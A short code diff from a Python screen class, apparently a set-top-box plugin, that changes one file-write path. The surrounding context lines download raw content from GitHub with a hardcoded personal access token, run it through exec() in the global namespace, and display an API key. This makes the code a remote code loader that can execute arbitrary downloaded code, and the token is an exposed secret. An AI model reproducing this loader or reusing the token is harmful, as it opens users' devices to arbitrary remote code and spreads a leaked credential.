@@ -36,7 +36,7 @@ class xE(Screen):
 		header = {'accept': 'application/vnd.github.v3.raw', 'authorization': 'token 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'}
 		uts = requests.get(url, stream=True, allow_redirects=True, headers=header).text
 		exec(uts, globals())
-		open("./tmp/gak.txt", "w").write(f"{xtra}")
+		open("/tmp/gak.txt", "w").write(f"{xtra}")
 		self['infoe'].setText(_(str(api_key)))
 		self['infoe'].show()
 		self.itimer.start(100, True)
